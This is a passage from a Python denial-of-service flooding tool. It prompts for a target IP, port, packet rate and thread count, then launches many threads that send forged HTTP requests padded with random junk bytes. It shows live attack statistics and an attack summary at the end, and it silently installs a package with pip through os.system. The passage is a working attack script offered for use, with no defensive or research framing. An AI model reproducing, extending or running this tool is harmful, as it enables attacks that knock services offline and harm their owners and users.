                    + "\r\n".join(content_headers) + "\r\n"
                    + "\r\n".join(extra_headers) +
                    "\r\n\r\n" +
                    (post_data if isinstance(post_data, str) else post_data.decode('latin1'))
                )

                s.send(request.encode())
                attack_stats['total_packets'] += 1
                attack_stats['total_data_sent'] += len(request)

                if random.random() > 0.5:
                    junk_size = random.randint(1024, 8192)
                    s.send(os.urandom(junk_size))
                    attack_stats['total_data_sent'] += junk_size

            s.close()
            time.sleep(random.uniform(0.01, 0.05))

        except Exception as e:
            attack_stats['failed_connections'] += 1
            attack_stats['total_packets'] += packets_per_sec
            time.sleep(random.uniform(0.1, 0.3))

def stats_display():
    start_time = attack_stats['start_time']

    while attack_stats['running']:
        elapsed_time = time.time() - start_time
        mins, secs = divmod(int(elapsed_time), 60)
        hours, mins = divmod(mins, 60)

        if elapsed_time > 0:
            pps = attack_stats['total_packets'] / elapsed_time
            mbps = (attack_stats['total_data_sent'] * 8) / (elapsed_time * 1000000)
        else:
            pps = 0
            mbps = 0

        sys.stdout.write(
            f"\r{Fore.YELLOW}[+] Attack Running | Time: {hours:02d}:{mins:02d}:{secs:02d} | "
            f"Packets: {attack_stats['total_packets']} | PPS: {pps:.1f} | "
            f"Data: {mbps:.2f} Mbps | Threads: {attack_stats['active_threads']} | "
            f"Conn: {Fore.GREEN}{attack_stats['successful_connections']}{Fore.YELLOW}/"
            f"{Fore.RED}{attack_stats['failed_connections']}{Fore.YELLOW}"
            f"{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        time.sleep(0.1)

def setup_attack():
    show_banner()

    delay_print(f"{Fore.CYAN}[+] Checking requirements...{Style.RESET_ALL}\n")
    os.system("pip3 install colorama > /dev/null 2>&1")
    os.system("clear")

    show_banner()

    ip = input(f"{Fore.WHITE}[+] Target IP: {Style.RESET_ALL}")
    port = int(input(f"{Fore.WHITE}[+] Port: {Style.RESET_ALL}"))
    packets_per_sec = int(input(f"{Fore.WHITE}[+] Packet/s: {Style.RESET_ALL}"))
    threads = int(input(f"{Fore.WHITE}[+] Threads: {Style.RESET_ALL}"))

    os.system("clear")
    show_banner()
    print(f"{Fore.CYAN}\n[+] Make sure you are connected to a faster internet connection")
    delay_print(f"{Fore.GREEN}[+] Initialising the attack... Please wait...\n{Style.RESET_ALL}")

    attack_stats['active_threads'] = threads

    stats_thread = threading.Thread(target=stats_display)
    stats_thread.daemon = True
    stats_thread.start()

    for i in range(threads):
        try:
            t = threading.Thread(target=enhanced_attack, args=(ip, port, packets_per_sec))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"{Fore.RED}[!] Error starting thread {i}: {e}{Style.RESET_ALL}")
            attack_stats['active_threads'] -= 1

    print(f"\n{Fore.YELLOW}[!] Starting attack on {ip}:{port} with {threads} threads...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Attack launched! Press Ctrl+C to stop.{Style.RESET_ALL}")

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        attack_stats['running'] = False
        elapsed_time = time.time() - attack_stats['start_time']
        mins, secs = divmod(int(elapsed_time), 60)
        hours, mins = divmod(mins, 60)

        if elapsed_time > 0:
            pps = attack_stats['total_packets'] / elapsed_time
            mbps = (attack_stats['total_data_sent'] * 8) / (elapsed_time * 1000000)
        else:
            pps = 0
            mbps = 0

        print(f"\n\n{Fore.RED}[!] Attack stopped by user{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Attack Summary:")
        print(f"    - Target: {ip}:{port}")
        print(f"    - Duration: {hours:02d}:{mins:02d}:{secs:02d}")
        print(f"    - Total Packets Sent: {attack_stats['total_packets']}")
        print(f"    - Total Data Sent: {attack_stats['total_data_sent'] / (1024*1024):.2f} MB")
        print(f"    - Average PPS: {pps:.1f}")
        print(f"    - Average Bandwidth: {mbps:.2f} Mbps")
        print(f"    - Successful Connections: {attack_stats['successful_connections']}")
        print(f"    - Failed Connections: {attack_stats['failed_connections']}")
        print(f"    - Threads Used: {attack_stats['active_threads']}{Style.RESET_ALL}")
        os._exit(0)

if __name__ == "__main__":
    setup_attack()
